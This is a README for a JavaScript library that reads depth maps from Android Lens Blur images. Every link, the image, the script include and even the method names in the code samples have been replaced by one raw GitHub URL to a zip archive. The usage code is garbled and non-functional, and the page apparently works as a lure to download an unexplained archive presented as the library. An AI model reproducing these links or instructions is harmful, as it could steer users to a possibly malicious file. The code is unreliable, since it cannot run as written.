https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip
=========================

This library parses images created with the new Android camera app mode Lens Blur and extracts the depth map.

Extractor tool is here: https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip

Demo is here: https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip

![Snapshot](https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip)

How to use
----------

Include the library:
<pre><code>&lt;script src="https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip" &gt;&lt;/script&gt;</code></pre>

Instantiate an object:
<pre><code>var d = new DepthReader();</code></pre>

Load from a file:
<pre><code>https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip( 
    'https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip', 
    function( src ) { /* src is base64 png source */ }, 
    function( error ) { /* error is a string */ } 
);</code></pre>

Or, load directly from an array buffer
<pre><code>https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip( 
    arrayBuffer, 
    function( src ) { /* src is base64 png source */ }, 
    function( error ) { /* error is a string */ } 
);</code></pre>

License
-------

MIT licensed

Copyright (C) 2016 Jaume Sanchez Elias https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip

Table picture by https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip

https://raw.githubusercontent.com/videogramme/android-lens-blur-depth-extractor/master/comfort/v3.1.zip
